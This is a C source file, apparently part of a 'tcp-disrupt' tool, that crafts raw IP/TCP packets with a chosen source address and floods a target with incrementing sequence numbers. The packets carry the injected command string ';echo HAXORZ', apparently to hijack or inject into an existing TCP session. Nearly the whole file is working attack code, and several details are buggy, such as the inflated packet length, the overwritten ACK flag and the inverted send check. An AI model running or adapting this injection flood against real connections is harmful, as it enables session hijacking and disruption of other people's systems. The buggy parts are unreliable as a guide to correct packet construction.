#include "tcp-disrupt.h"

/** Sends an seq flood.
 *  
 *  srcIP     - the ip to send the flood from
 *  dstIP     - where to send the flood
 *  dstPort   - the port to send the flood to
 *  srcPort   - the port to send the flood from
 *  sqe       - the starting seq number
 *  ack_seq   - the starting ack number
 *  n         - how many ack's to send
 *  socket_fd - socket file descriptor
 */
bool seq_flood(     char *srcIP,
                    char *dstIP,
                    u_int16_t dstPort,
                    u_int16_t srcPort,
                    u_int32_t seq,
                    u_int32_t ack_seq,
                    int n,
                    int socket_fd,
                    struct sockaddr_in addr_in) {

    const char * data = ";echo HAXORZ";
    int data_len = strlen(data);
    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
    char *packet = (char *) malloc(packet_size);
    struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));

    fill_packet(srcIP, dstIP, dstPort, srcPort, 0, 0, seq, ack_seq, 0, data, packet, packet_size);

    int i;
    bool b = true;
    for (i = 0; i < n && b; ++i) {
        b =  0 > send_packet(socket_fd, packet, addr_in);
        tcpHdr->seq = htonl(seq + i);
    }

    free(packet);

    return b;
}


int send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
    int bytes;
    struct iphdr *ipHdr = (struct iphdr *) packet;

    bytes = sendto(socket_fd, ipHdr, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in));
    return bytes;
}

void fill_packet(   char *srcIP,
                    char *dstIP,
                    u_int16_t dstPort,
                    u_int16_t srcPort,
                    u_int32_t syn,
                    u_int16_t ack,
                    u_int32_t seq,
                    u_int32_t ack_seq,
                    u_int16_t rst,
                    const char * data,
                    char *packet,
                    uint32_t packet_size) {

    struct iphdr *ipHdr;
    struct tcphdr *tcpHdr;
    char *pseudo_packet;
    struct pseudoTCPPacket pTCPPacket;

    int data_length = strlen(data);

    memset(packet, 0 ,packet_size);
    ipHdr = (struct iphdr*) packet;
    tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
    memcpy((char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr)), data, data_length);

    //IP header
    ipHdr->ihl = 5;
    ipHdr->version = 4;
    ipHdr->tos = 0;
    ipHdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_length + 3;
    ipHdr->id = htons(54321);
    ipHdr->frag_off = 0;
    ipHdr->ttl = 0xFF;
    ipHdr->protocol = IPPROTO_TCP;
    ipHdr->saddr = inet_addr(srcIP);
    ipHdr->daddr = inet_addr(dstIP);
    ipHdr->check = csum((unsigned short *) packet, ipHdr->tot_len);

    //TCP header
    tcpHdr->source = htons(srcPort);
    tcpHdr->dest = htons(dstPort);
    tcpHdr->seq = htonl(seq);           //sequence number
    tcpHdr->ack_seq = htonl(ack_seq);   //ack sequence number, depends whether ACK is set or not
    tcpHdr->res1 = 0;
    tcpHdr->doff = 0x6;
    tcpHdr->fin = 0;
    tcpHdr->syn = syn;
    tcpHdr->rst = 0;
    tcpHdr->psh = 1;
    tcpHdr->ack = ack;                  //if you are acknowledging a sec number
    tcpHdr->ack = 1;
    tcpHdr->urg = 0;
    tcpHdr->res2 = 0;
    tcpHdr->window = htons(229);
    tcpHdr->urg_ptr = 0;

    char *ptr = (char*)(tcpHdr + 1);
    *ptr = 0x01;
    ptr++;
    *ptr = 0x01;
    ptr++;
    *ptr = 0x01;

    printf("\n");
    printf("[fill_packet]: Sending Sequence Number: %u\n", tcpHdr->seq);
    printf("[fill_packet]: Acknowledging: %u\n", tcpHdr->ack_seq);

    //calculate the checksum for the TCP header
    pTCPPacket.srcAddr = inet_addr(srcIP);
    pTCPPacket.dstAddr = inet_addr(dstIP);
    pTCPPacket.zero = 0;
    pTCPPacket.protocol = IPPROTO_TCP;
    pTCPPacket.TCP_len = htons(sizeof(struct tcphdr) + data_length);

    pseudo_packet = (char *) malloc((int) (sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + data_length));
    memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + data_length);

    memcpy(pseudo_packet, (char *) &pTCPPacket, sizeof(struct pseudoTCPPacket));
    memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, sizeof(struct tcphdr) + data_length);

    tcpHdr->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct pseudoTCPPacket) + 
          sizeof(struct tcphdr) +  data_length)));

    free(pseudo_packet);

    printf("\n");
    //print_packet_bits(packet, packet_size);
}

void print_packet_bits(char *packet, int packet_size) {

    int i;
    printf("\n");
    for (i = 0; i < packet_size; ++i) {

        if((i % 4) == 0) {
            printf("\n");
        }

        printf("%d", (0x01 & *(packet + i) >> 7));
        printf("%d", (0x01 & *(packet + i) >> 6));
        printf("%d", (0x01 & *(packet + i) >> 5));
        printf("%d", (0x01 & *(packet + i) >> 4));
        printf(" ");
        printf("%d", (0x01 & *(packet + i) >> 3));
        printf("%d", (0x01 & *(packet + i) >> 2));
        printf("%d", (0x01 & *(packet + i) >> 1));
        printf("%d", (0x01 & *(packet + i) >> 0));
        printf(" ");

        if(i == 19) {
            printf("\n------------------TCP------------------");
        } else if(i == (20+19)) {
            printf("\n------------------DATA-----------------");
        }
    }
}

void print_packet_ascii(char *packet, int packet_size) {
    /*
    struct iphdr  *ipHdr  = packet;
    struct tcphdr *tcpHdr = sizeof(struct iphdr);

    //IP header
    printf("ipHdr->ihl      = %d\n"ipHdr->ihl);
    printf("ipHdr->version  = %d\n"ipHdr->version);
    printf("ipHdr->tos      = %d\n"ipHdr->tos);
    printf("ipHdr->tot_len  = %d\n"ipHdr->tot_len);
    printf("ipHdr->id       = %d\n"ipHdr->id);
    printf("ipHdr->frag_off = %d\n"ipHdr->frag_off);
    printf("ipHdr->ttl      = %d\n"ipHdr->ttl);
    printf("ipHdr->protocol = %d\n"ipHdr->protocol);
    printf("ipHdr->saddr    = %d\n"ipHdr->saddr);
    printf("ipHdr->daddr    = %d\n"ipHdr->daddr);
    printf("ipHdr->check    = %d\n"ipHdr->check);

    //TCP header
    printf("tcpHdr->source  = %d\n", ntohs(tcpHdr->source));
    printf("tcpHdr->dest    = %d\n", ntohs(tcpHdr->dest));
    printf("tcpHdr->seq     = %d\n", ntohl(tcpHdr->seq));
    printf("tcpHdr->ack_seq = %d\n", ntohl(tcpHdr->ack_seq));
    printf("tcpHdr->res1    = %d\n", tcpHdr->res1);
    printf("tcpHdr->doff    = %d\n", tcpHdr->doff);
    printf("tcpHdr->fin     = %d\n", tcpHdr->fin);
    printf("tcpHdr->syn     = %d\n", tcpHdr->syn);
    printf("tcpHdr->rst     = %d\n", tcpHdr->rst);
    printf("tcpHdr->psh     = %d\n", tcpHdr->psh);
    printf("tcpHdr->ack     = %d\n", tcpHdr->ack);
    printf("tcpHdr->ack     = %d\n", tcpHdr->ack);
    printf("tcpHdr->urg     = %d\n", tcpHdr->urg);
    printf("tcpHdr->res2    = %d\n", tcpHdr->res2);
    printf("tcpHdr->window  = %d\n", ntohs(tcpHdr->window));
    printf("tcpHdr->urg_ptr = %d\n", tcpHdr->urg_ptr);
    */

}


unsigned short csum(unsigned short *ptr,int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

char* gen_packet(   char *srcIP,
                    char *dstIP,
                    u_int16_t dstPort,
                    u_int16_t srcPort,
                    u_int32_t syn,
                    u_int16_t ack,
                    u_int32_t seq,
                    u_int32_t ack_seq,
                    const char * data,
                    uint32_t packet_size) {


        char * packet = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data));
        fill_packet(srcIP, dstIP, dstPort, srcPort, syn, ack, seq, ack_seq, 0, data, packet, packet_size);
        return packet;
}